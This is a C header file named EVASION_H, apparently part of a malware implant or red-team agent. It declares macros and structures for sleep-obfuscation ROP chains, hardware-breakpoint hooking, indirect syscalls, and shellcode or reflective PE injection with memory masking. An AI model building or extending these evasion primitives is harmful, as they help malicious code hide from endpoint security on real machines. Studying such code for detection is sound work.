#ifndef EVASION_H
#define EVASION_H

#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {   \
        Rop[ i ].Rax = U_PTR( p );                 \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) { \
        Rop[ i ].Rbx = U_PTR( & p );               \
    } else {                                       \
        Rop[ i ].Rip = U_PTR( p );                 \
    }

typedef struct _DESCRIPTOR_HOOK {
    ULONG  ID;
    HANDLE Handle;
    BOOL   Processed;

    struct {
        UPTR Address;
        VOID ( *Detour )( PCONTEXT );
    } Hook[4];

    struct _DESCRIPTOR_HOOK* Next;
    struct _DESCRIPTOR_HOOK* Prev;
} DESCRIPTOR_HOOK, *PDESCRIPTOR_HOOK;

#define CONTINUE_EXEC( Ctx )( Ctx->EFlags = Ctx->EFlags | ( 1 << 16 ) )

#ifdef _WIN64
#define SET_RET( Ctx, Val )( U_PTR( Ctx->Rax = U_PTR( Val ) ) )
#elif  _WIN32
#define SET_RET( Ctx, Val )( U_PTR( Ctx->Eax = U_PTR( Val ) ) )
#endif

typedef enum ESYS_OPT {
    Alloc,
    Protect,
    Write,
    QueueApc,
    OpenProc,
    Last
};

typedef struct {
    ULONG ssn;
    ULONG Hash;
    UPTR  Address;
    UPTR  Instruction;
} EXT, *PEXT;

EXTERN_C NTSTATUS ExecSyscall( ... );

enum {
    Dr0,
    Dr1,
    Dr2,
    Dr3
} KH_DRX;

enum {
    PeReflection
} KH_INJ_PE;

enum {
    ScClassic,
    ScStomp
} KH_INJ_SC;

enum {
    MaskTimer = 1,
    MaskApc,
    MaskWait
} KH_MASK;

enum {
    RegRax,
    RegRsi,
    RegRbx = 0x23
} KH_REG;

#endif // EVASION_H